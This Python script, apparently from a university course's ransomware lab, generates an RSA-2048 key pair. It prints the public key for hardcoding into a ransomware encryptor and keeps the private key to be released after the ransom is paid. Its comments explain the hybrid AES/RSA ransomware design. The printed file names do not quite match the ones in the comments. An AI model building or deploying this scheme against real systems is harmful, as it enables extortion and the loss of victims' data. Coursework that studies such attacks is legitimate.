#!/usr/bin/env python3
# =============================================================================
# CSCE 5550 - Ransomware Project
# attacker_keygen.py  --  run on the ATTACKER machine (Kali VM)
#
# Generates the RSA-2048 key pair used by the hybrid-encryption schema:
#
#   * PUBLIC key (pk)  -> HARDCODED inside ransomware_encrypt.py (the pk
#     travels with the ransomware, exactly like real ransomware families
#     embed their public key in the binary; the pk is useless to the victim
#     because only the SECRET key can unwrap the AES session key).
#     After running this script, copy the paste-ready block it prints into
#     the PUBLIC_KEY_PEM constant of ransomware_encrypt.py.
#
#   * SECRET key (sk)  -> saved as ransom_private.pem. It NEVER leaves the
#     attacker machine: after the ransom is paid, the attacker transfers
#     this file (plus the decryptor) to the victim - this is the
#     "decryption component is supposed to be transferred to the victim once
#     the ransom is paid" required by the project description. Alternatively
#     it can be hardcoded in ransomware_decrypt.py (PRIVATE_KEY_PEM).
#
# Why RSA-2048, and why is RSA used ONLY for the AES key?
#   RSA is asymmetric (whatever the public key encrypts, only the secret key
#   can decrypt), which is exactly the property ransomware needs so that
#   victims cannot simply extract the key from the malware binary. However,
#   RSA is slow and can only encrypt small payloads (~190 bytes per
#   operation for a 2048-bit key with OAEP padding). AES is fast and made
#   for bulk data, but both sides share the same key, so the key must be
#   protected. The hybrid schema gets the best of both:
#       AES-256-GCM   -> encrypts all the files (speed)
#       RSA-2048-OAEP -> encrypts only the 32-byte AES key (asymmetry)
#
# LAB USE ONLY: this code runs exclusively inside the course VM lab.
# =============================================================================

from Crypto.PublicKey import RSA

# ------------------------------ configuration --------------------------------
KEY_SIZE_BITS = 2048                    # modern minimum for RSA security
PRIVATE_KEY_FILE = 'ransom_private.pem' # sk - keep on Kali, never on victim


def main():
    print('[keygen] generating RSA-%d key pair (may take a few seconds)...'
          % KEY_SIZE_BITS)

    # RSA.generate() uses pycryptodome's cryptographically secure RNG.
    key = RSA.generate(KEY_SIZE_BITS)

    # Export both keys in PEM (base64) format.
    private_pem = key.export_key()             # PKCS#1 'RSA PRIVATE KEY'
    public_pem = key.publickey().export_key()  #          'RSA PUBLIC KEY'

    # Save the secret key file (this is what the attacker sends after payment).
    with open(PRIVATE_KEY_FILE, 'wb') as f:
        f.write(private_pem)

    # Sanity check: reload the key from disk and verify the pair matches.
    check = RSA.import_key(open(PRIVATE_KEY_FILE, 'rb').read())
    assert check.publickey().export_key() == public_pem, 'key pair mismatch!'

    print('[keygen] private key (sk) -> %s  [KEEP ON ATTACKER / send after '
          'payment]' % PRIVATE_KEY_FILE)

    # Print the public key as a paste-ready block for ransomware_encrypt.py.
    print()
    print('===================== COPY THE BLOCK BELOW INTO')
    print('            encrypt.py  (PUBLIC_KEY_PEM)')
    print('=====================================================================')
    print('PUBLIC_KEY_PEM = """' + public_pem.decode() + '"""')
    print('=====================================================================')

    # Print the private key as a paste-ready block for ransomware_decrypt.py.
    print()
    print('===================== COPY THE BLOCK BELOW INTO')
    print('            dencrypt.py  (PRIVATE_KEY_PEM)')
    print('=====================================================================')
    print('PRIVATE_KEY_PEM = """' + private_pem.decode() + '"""')
    print('=====================================================================')

    # Use SHA256 to generate a clean fingerprint of the public key bytes
    from Crypto.Hash import SHA256
    h_pk = SHA256.new(public_pem)
    print('[keygen] Public key fingerprint (SHA-256): %s' % h_pk.hexdigest())
    
    h_sk = SHA256.new(private_pem)
    print('[keygen] Private key fingerprint (SHA-256): %s' % h_sk.hexdigest())

if __name__ == '__main__':
    main()
